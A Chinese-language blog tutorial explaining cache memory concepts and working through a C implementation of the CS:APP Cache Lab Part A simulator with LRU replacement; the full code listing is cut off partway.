<h1 id="Part-A-Writing-a-Cache-Simulator"><a href="#Part-A-Writing-a-Cache-Simulator" class="headerlink" title="Part A: Writing a Cache Simulator"></a>Part A: Writing a Cache Simulator</h1><blockquote>
<p>在Part A中，你将在<code>csim.c</code>中编写一个缓存模拟器，该模拟器以<code>valgrind</code>内存跟踪为输入，在该跟踪上模拟缓存的命中/未命中行为，并输出命中、未命中和逐出的总数。</p>
<p>我们为你提供了参考缓存模拟器的二进制可执行文件，称为<code>csim-ref</code>，它可在<code>valgrind</code>跟踪文件上模拟具有任意大小和关联性的缓存行为。 在选择逐出哪个缓存行时，它使用LRU（最近使用）替换策略。</p>
<p>参考模拟器采用以下命令行参数：</p>
<p>用法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-h</code>：打印使用情况信息的可选帮助标志</li>
<li><code>-v</code>：显示跟踪信息的可选详细标志</li>
<li><code>-s &lt;s&gt;</code>：设置的索引位数（$S=2^{s}$是设置的数量）</li>
<li><code>-E &lt;E&gt;</code>：关联性（每组的行数）</li>
<li><code>-b &lt;b&gt;</code>：块位数（$B=2^{b}$是块大小）</li>
<li><code>-t &lt;tracefile&gt;</code>：要重放的<code>valgrind</code>跟踪的名称</li>
</ul>
<p>命令行参数基于CS:APP3e中文版教科书第426页的符号（s，E和b）。 </p>
<p>Part A的工作是填写<code>csim.c</code>文件，以便它采用相同的命令行参数并产生与参考模拟器相同的输出。 请注意，该文件几乎完全为空。 你需要从头开始编写。</p>
<p><strong>Programming Rules for Part A</strong></p>
<ul>
<li><p>在<code>csim.c</code>的标题注释中包括你的姓名和ID。</p>
</li>
<li><p>你的<code>csim.c</code>文件必须在没有<code>warnings</code>的情况下进行编译才能获得分数。</p>
</li>
<li><p>你的模拟器必须对任意<code>s</code>、<code>E</code>和<code>b</code>正确工作。这意味着你将需要使用<code>malloc</code>函数为模拟器的数据结构分配存储空间。键入“<code>man malloc</code>”以获取有关此功能的信息。</p>
</li>
<li><p>在本实验中，我们仅对数据高速缓存性能感兴趣，因此你的模拟器应忽略所有指令高速缓存访问（以“<code>I</code>”开头的行）。回想一下，<code>valgrind</code>总是将“<code>I</code>”放在第一列（没有前导空格）中，并且将“<code>M</code>”，“<code>L</code>”和“<code>S</code>”放在第二列（带有前导空格）中。这可以帮助你解析跟踪。</p>
</li>
<li><p>要获得Part A的分数，你必须在主函数末尾调用函数<code>printSummary</code>，其中包含命中，未命中和逐出的总数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">printSummary(hit_count, miss_count, eviction_count);</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于本实验，你应该假设内存访问已正确对齐，以使单个内存访问永远不会越过块边界。通过作出此假设，你可以忽略<code>valgrind</code>跟踪中的请求大小。</p>
</li>
</ul>
</blockquote>
<p>查看参考缓存模拟器<code>csim-ref</code>时可能会出现：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./csim-ref -v -s 4 -E 1 -b 4 -t traces/yi.trace</span><br><span class="line">bash: ./csim-ref: 权限不够</span><br></pre></td></tr></table></figure>
<p>无论是否在ubuntu中解压都会提示权限不够，此时需要增加权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ chmod +x csim-ref</span><br></pre></td></tr></table></figure>
<p>后续仍可依此方法添加权限。</p>
<p>再次运行，得到输出如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">L 10,1 miss </span><br><span class="line">M 20,1 miss hit </span><br><span class="line">L 22,1 hit </span><br><span class="line">S 18,1 hit </span><br><span class="line">L 110,1 miss eviction </span><br><span class="line">L 210,1 miss eviction </span><br><span class="line">M 12,1 miss eviction hit </span><br><span class="line">hits:4 misses:5 evictions:3</span><br></pre></td></tr></table></figure>
<p>我们的目的就是编写一个和它功能相同的高速缓存模拟器。</p>
<p><em>（没关系，前面可能看不懂，下面才是正文。）</em></p>
<h2 id="什么是高速缓存？"><a href="#什么是高速缓存？" class="headerlink" title="什么是高速缓存？"></a>什么是高速缓存？</h2><p><strong>高速缓存（cache）</strong>是一个小而快速的存储设备，作为存储在更大、也更慢的设备中的数据对象的<strong>缓冲区域</strong>。</p>
<p>设想你需要利用一些工具去完成一项任务，第一次使用一个工具时，你会从工具箱中拿出它，用完之后你会放在手边，以便下次使用。如果手边的空间有限，你需要把比较不常用的工具放回工具箱中，把最常使用的工具留在手边。</p>
<p>这就类似高速缓存的思想。</p>
<p>实际上，高速缓存与下一层存储器之间是以<strong>块（block）</strong>作为传送单元（transfer unit）来传送数据的（更确切地说，应该是复制），即数据被划分成了若干块来进行复制，这就好比上面提到的“工具”。</p>
<p>当我们需要某个数据时，如果它恰好在“手边”，即它所在的块已经缓存在高速缓存中，这就是<strong>缓存命中（cache hit）</strong>；若不在则为<strong>缓存不命中（cache miss）</strong>。</p>
<p>当某个块出现缓存不命中时，我们需要将它加载到缓存中。如果缓存中有空位，则直接复制到那个位置。如果缓存已满，则只能覆盖掉一个缓存中现存的块，这个过程就是<strong>替换（replacing）</strong>或<strong>驱逐（evicting）</strong>，被驱逐的称为<strong>牺牲块（victim block）</strong>。</p>
<p>该驱逐哪一个呢？这就需要一种策略，叫<strong>替换策略（replacement policy）</strong>：</p>
<ul>
<li>随便驱逐一个，即<strong>随机替换策略</strong>；</li>
<li>驱逐最近最不常用的那个，即<strong>LRU替换策略</strong>。</li>
</ul>
<p>都哪些情况会出现缓存不命中呢？</p>
<ul>
<li>开始的时候，“手边”是空的，当然没有数据对象在缓存中，这就是<strong>冷不命中（cold miss）</strong>或<strong>强制性不命中（compulsory miss）</strong>，这个空的缓存叫<strong>冷缓存（cold cache）</strong>，需要暖身（warmed up）；</li>
<li>类似于哈希表，缓存从下一层取出的块需要按照一定的放置策略（类似于哈希函数）来放到缓存中，若两个数据对象映射到同一个缓存块中，这就发生了<strong>冲突不命中（conflict miss）</strong>；</li>
<li>程序的每个阶段需要访问缓存块的某个相对稳定不变的集合，称为<strong>工作集（working set）</strong>。当缓存太小，不能容纳这个工作集，就出现<strong>容量不命中（capacity miss）</strong>。</li>
</ul>
<hr>
<p>回到正题，这个函数需要实现高速缓存的功能，我们需要理解高速缓存的构成和工作原理。</p>
<p>高速缓存可看成一个数组，数组的每一个元素称为一个<strong>高速缓存组（cache set）</strong>，每一组包含若干个<strong>高速缓存行（cache line）</strong>，每一行有一个<strong>高速缓存块（cache block）</strong>、一个<strong>有效位（valid bit）</strong>和一个<strong>标记位（tag bit）</strong>：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png" alt="高速缓存"></p>
<p>其中：</p>
<ul>
<li>存储器地址有m位（上图(b)）：<ul>
<li>t位标记（行匹配时对应行的标记位）；</li>
<li>s位组索引（组选择时对应组号）；</li>
<li>b位块偏移（字选择时对应第一个字节的偏移量）；</li>
</ul>
</li>
<li>数组有$S=2^{s}$组；</li>
<li>每一组有E行：<ul>
<li>E=1（S=C/B），称为<strong>直接映射高速缓存（direct-mapped cache）</strong>；</li>
<li>1&lt;E&lt;C/B，称为<strong>组相联高速缓存（set associative cache）</strong>；</li>
<li>E=C/B（S=1），称为<strong>全相联高速缓存（fully associative cache）</strong>；</li>
</ul>
</li>
<li>每一行有1个有效位、t=m-(b+s)个标记位和一个块；</li>
<li>每一块有$B=2^{b}$字节；</li>
</ul>
<p>则高速缓存可用元组(S,E,B,m)表示，总大小（所有块大小之和）C=S*E*B。</p>
<p>对应每一组的不同分行，高速缓存有三种缓存映射方式，我们设计程序时需要分别考虑。</p>
<p>要求中也提到了必要时需使用LRU策略。</p>
<p>根据作业一的经验，我们需要从命令行读取参数。</p>
<p>现在对我们即将要做的事已经有一个大概的了解了，打开<code>csim.c</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printSummary(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>……看来需要我们从零开始。</p>
<h2 id="Cache-结构"><a href="#Cache-结构" class="headerlink" title="Cache 结构"></a>Cache 结构</h2><p>根据上面的分析，高速缓存是一个大小为S的数组，数组的每一项是高速缓存组（又可以看作一个大小为E的数组），高速缓存组的每一项是高速缓存行，高速缓存行又包含了有效位、标记位和块（块没什么用，我们不需要进行字抽取，可以忽略）。</p>
<p>所以可以利用二维数组进行具体的实现，而且可以将高速缓存行封装成一个结构体。</p>
<p>注意LRU策略需要判断每个缓存块存取的时间（可以理解为距上一次更新的时间），这也是每个缓存行的属性：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> valid;</span><br><span class="line">  <span class="keyword">int</span> tag;</span><br><span class="line">  <span class="keyword">int</span> time_stamp;</span><br><span class="line">&#125; cache_line;</span><br><span class="line">cache_line** cache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Cache-初始化"><a href="#Cache-初始化" class="headerlink" title="Cache 初始化"></a>Cache 初始化</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_cache</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cache = (cache_line**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line*) * S);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++) &#123;</span><br><span class="line">    cache[i] = (cache_line*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line) * E);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; j++) &#123;</span><br><span class="line">      cache[i][j].valid = <span class="number">0</span>;</span><br><span class="line">      cache[i][j].tag = <span class="number">-1</span>;</span><br><span class="line">      cache[i][j].time_stamp = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="更新缓存块"><a href="#更新缓存块" class="headerlink" title="更新缓存块"></a>更新缓存块</h2><p>对于输入的地址，需要更新对应位置的缓存块（缓存行），故函数的参数为地址：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> addr)</span></span></span><br></pre></td></tr></table></figure>
<p>根据设定的s和b大小，确定地址的组索引和块偏移：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s_addr = (addr &gt;&gt; b) &amp; ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>);</span><br><span class="line">t_addr = addr &gt;&gt; (s + b);</span><br></pre></td></tr></table></figure>
<p>根据组索引找到对应组，再在组中的E行中寻找标记位相同的行，若有则说明命中，更新其时间戳，并直接返回：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">  <span class="keyword">if</span> (cache[s_addr][i].tag == t_addr) &#123;</span><br><span class="line">    cache[s_addr][i].time_stamp = <span class="number">0</span>;</span><br><span class="line">    hit_count++;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>根据要求，需要分别用<code>hit_count</code>、<code>miss_count</code>和<code>eviction_count</code>记录命中总次数、未命中总次数和块替换（逐出）总次数。</p>
</blockquote>
<p>若上一步没有返回，则说明出现了缓存不命中，继续执行看看有没有空位：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">  <span class="keyword">if</span> (!cache[s_addr][i].valid) &#123;</span><br><span class="line">    cache[s_addr][i].valid = <span class="number">1</span>;</span><br><span class="line">    cache[s_addr][i].tag = t_addr;</span><br><span class="line">    cache[s_addr][i].time_stamp = <span class="number">0</span>;</span><br><span class="line">    miss_count++;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>若上一步还是没有返回，则说明这一组已经满了，需要使用LRU策略进行驱逐即块替换，即找到这一组中最近最不常用的（最长时间未更新的、时间戳最大的）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> max_stamp = INT_MIN, max_stamp_index = <span class="number">-1</span>;</span><br><span class="line">miss_count++;</span><br><span class="line">eviction_count++;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">  <span class="keyword">if</span> (cache[s_addr][i].time_stamp &gt; max_stamp) &#123;</span><br><span class="line">    max_stamp = cache[s_addr][i].time_stamp;</span><br><span class="line">    max_stamp_index = i;</span><br><span class="line">  &#125;</span><br><span class="line">cache[s_addr][max_stamp_index].tag = t_addr;</span><br><span class="line">cache[s_addr][max_stamp_index].time_stamp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用<code>INT_MIN</code>需要包含以下头文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="更新时间戳"><a href="#更新时间戳" class="headerlink" title="更新时间戳"></a>更新时间戳</h2><p>需要适时更新时间戳，即将所有已缓存的块的时间戳全部增1：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_time</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">      <span class="keyword">if</span> (cache[i][j].valid)</span><br><span class="line">        cache[i][j].time_stamp++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="打印用法"><a href="#打印用法" class="headerlink" title="打印用法"></a>打印用法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Options:\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  -h         Print this help message.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  -v         Optional verbose flag.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  -t &lt;file&gt;  Trace file.\n\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Examples:\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span></span><br><span class="line">            <span class="string">&quot;  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><p>需要从命令行读入参数，则主函数的格式为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br></pre></td></tr></table></figure>
<h3 id="变量初始化"><a href="#变量初始化" class="headerlink" title="变量初始化"></a>变量初始化</h3><p>前面提到的三个计数器需要初始化为0：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hit_count = miss_count = eviction_count = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h3 id="处理参数"><a href="#处理参数" class="headerlink" title="处理参数"></a>处理参数</h3><p>回想一下我们的参数都有哪几种可能：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">Usage: ./csim [-hv] -s <span class="symbol">&lt;num&gt;</span> -E <span class="symbol">&lt;num&gt;</span> -<span class="keyword">b</span> <span class="symbol">&lt;num&gt;</span> -t <span class="symbol">&lt;file&gt;</span></span><br><span class="line">Option<span class="variable">s:</span></span><br><span class="line">  -h         <span class="keyword">Print</span> this <span class="keyword">help</span> message.</span><br><span class="line">  -v         Optional <span class="keyword">verbose</span> flag.</span><br><span class="line">  -s <span class="symbol">&lt;num&gt;</span>   Number of <span class="keyword">set</span> <span class="built_in">index</span> bits.</span><br><span class="line">  -E <span class="symbol">&lt;num&gt;</span>   Number of lines per <span class="keyword">set</span>.</span><br><span class="line">  -<span class="keyword">b</span> <span class="symbol">&lt;num&gt;</span>   Number of block offset bits.</span><br><span class="line">  -t <span class="symbol">&lt;file&gt;</span>  Trace <span class="keyword">file</span>.</span><br></pre></td></tr></table></figure>
<p>需要使用<code>getopt</code>函数处理传入的参数。</p>
<blockquote>
<p>使用<code>getopt</code>函数需要包含以下头文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><code>getopt</code>函数有3个参数，分别为：</p>
</blockquote>
<ul>
<li>读入参数的个数</li>
<li>参数字符串指针</li>
<li>与参数匹配的字符串</li>
</ul>
<p>当字符表示为<code>x</code>时说明命令为<code>-x</code>；当字符表示为<code>x:</code>时说明命令<code>-x</code>后跟了一个参数（保存在<code>optarg</code>中）。</p>
<p>且返回值为<code>int</code>型：</p>
<ul>
<li>若参数字符和指定字符匹配，则返回该字符，并移动指针到下一个字符；</li>
<li>不匹配则返回字符<code>&#39;?&#39;</code>，同样移动指针到下一个字符；</li>
<li>到字符串末尾，返回-1。</li>
</ul>
<p>所以我们只需将每次<code>getopt</code>函数读入的一个字符存到<code>opt</code>中，再用<code>switch</code>判断即可：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">  <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">      printUsage();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">      v = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">      s = atoi(optarg);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">      E = atoi(optarg);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">      b = atoi(optarg);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">      <span class="built_in">strcpy</span>(filename, optarg);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>使用字符串函数需要包含以下头文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="初始化-Cache"><a href="#初始化-Cache" class="headerlink" title="初始化 Cache"></a>初始化 Cache</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">init_cache();</span><br></pre></td></tr></table></figure>
<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>使用<code>fopen</code>函数，进行读操作<code>&quot;r&quot;</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE* fp = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;No such file!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>fgets</code>函数读取文件中一行文本存入<code>buffer</code>，再根据这一行的格式：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[space]</span>operation <span class="selector-tag">address</span>,size</span><br></pre></td></tr></table></figure>
<p>进行相关操作。根据要求，只需考虑<code>operation</code>是<code>L</code>、<code>M</code>和<code>S</code>的情况：其中加载操作<code>L</code>和存储操作<code>S</code>都至多会产生一次缓存不命中；而数据修改操作<code>M</code>是先加载后存储，可能会产生两种情况：两次内存命中或一次不命中一次命中（并进行相应的替换）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (fgets(buffer, <span class="number">1000</span>, fp)) &#123;</span><br><span class="line">  <span class="built_in">sscanf</span>(buffer, <span class="string">&quot; %c %xu,%d&quot;</span>, &amp;type, &amp;addr, &amp;temp);</span><br><span class="line">  <span class="keyword">switch</span>(type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">      update(addr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">      update(addr);</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">      update(addr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  update_time();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">  <span class="built_in">free</span>(cache[i]);</span><br><span class="line"><span class="built_in">free</span>(cache);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line">printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Author: SuperPung</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> h, v, s, E, b, S;</span><br><span class="line"><span class="keyword">int</span> hit_count, miss_count, eviction_count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> filename[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> valid;</span><br><span class="line">  <span class="keyword">int</span> tag;</span><br><span class="line">  <span class="keyword">int</span> time_stamp;</span><br><span class="line">&#125; cache_line;</span><br><span class="line">cache_line** cache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_cache</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  cache = (cache_line**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line*) * S);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++) &#123;</span><br><span class="line">    cache[i] = (cache_line*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_line) * E);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; j++) &#123;</span><br><span class="line">      cache[i][j].valid = <span class="number">0</span>;</span><br><span class="line">      cache[i][j].tag = <span class="number">-1</span>;</span><br><span class="line">      cache[i][j].time_stamp = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max_stamp = INT_MIN, max_stamp_index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> s_addr, t_addr;</span><br><span class="line"></span><br><span class="line">    s_addr = (addr &gt;&gt; b) &amp; ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>);</span><br><span class="line">    t_addr = addr &gt;&gt; (s + b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">        <span class="keyword">if</span> (cache[s_addr][i].tag == t_addr) &#123;</span><br><span class="line">            cache[s_addr][i].time_stamp = <span class="number">0</span>;</span><br><span class="line">            hit_count++;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">        <span class="keyword">if</span> (!cache[s_addr][i].valid) &#123;</span><br><span class="line">            cache[s_addr][i].valid = <span class="number">1</span>;</span><br><span class="line">            cache[s_addr][i].tag = t_addr;</span><br><span class="line">            cache[s_addr][i].time_stamp = <span class="number">0</span>;</span><br><span class="line">            miss_count++;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    miss_count++;</span><br><span class="line">    eviction_count++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)</span><br><span class="line">    <span class="keyword">if</span> (cache[s_addr][i].time_stamp &gt; max_stamp) &#123;</span><br><span class="line">        max_stamp = cache[s_addr][i].time_stamp;</span><br><span class="line">        max_stamp_index = i;</span><br><span class="line">    &#125;</span><br><span class="line">    cache[s_addr][max_stamp_index].tag = t_addr;</span><br><span class="line">    cache[s_addr][max_stamp_index].time_stamp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update_time</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; S; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">      <span class="keyword">if</span> (cache[i][j].valid)</span><br><span class="line">        cache[i][j].time_stamp++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Usage: ./csim-ref [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t 